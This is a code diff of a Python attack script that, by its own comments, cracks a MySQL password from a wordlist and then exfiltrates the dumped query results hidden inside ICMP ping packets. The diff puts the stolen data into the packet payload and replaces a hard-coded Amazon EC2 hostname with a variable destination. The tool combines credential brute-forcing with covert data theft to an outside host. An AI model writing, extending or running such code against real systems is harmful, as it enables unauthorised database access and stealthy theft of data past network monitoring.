@@ -1,6 +1,7 @@
 import mysql.connector as mysql
 import os, sys, socket, struct, select, time
 import datetime
+import re
 
 # Crack password
 
@@ -17,7 +18,7 @@ def connect(pw):
         return("wrong")
 
 # we need a good wordlist...
-wordlist=["password321", "Password!123"]
+wordlist=[]
 
 for word in wordlist:
     print(word)
@@ -45,10 +46,9 @@ def string(x):
 
     return x
 
-#result in string format
+#result in string format without nonalphanumeric chars.
 res_str = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([string(x) for x in tup]) for tup in result])
-
-print("sending:", res_str)
+res_str = re.sub(r'[^a-zA-Z\d\s\.]', "", res_str)
 
 # Exfiltrate data in a packet header
 def checksum(data):
@@ -89,7 +89,7 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
         "bbHHh", ICMP_ECHO_REQUEST,
         ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
     bytesInDouble = struct.calcsize("d")
-    data = "hello me@me.com 1287308198" * 20 #res_str doesn't work here for some reason???
+    data = res_str
     data = struct.pack("d", time.time()) + data.encode()
 
     ICMP_CHECKSUM = checksum(header + data)
@@ -125,5 +125,5 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
         except Exception as e:
             raise e
 
-
-sendOnePing(1, "ec2-54-161-19-249.compute-1.amazonaws.com", 102)
+#replace ip
+sendOnePing(1, ip, 102)
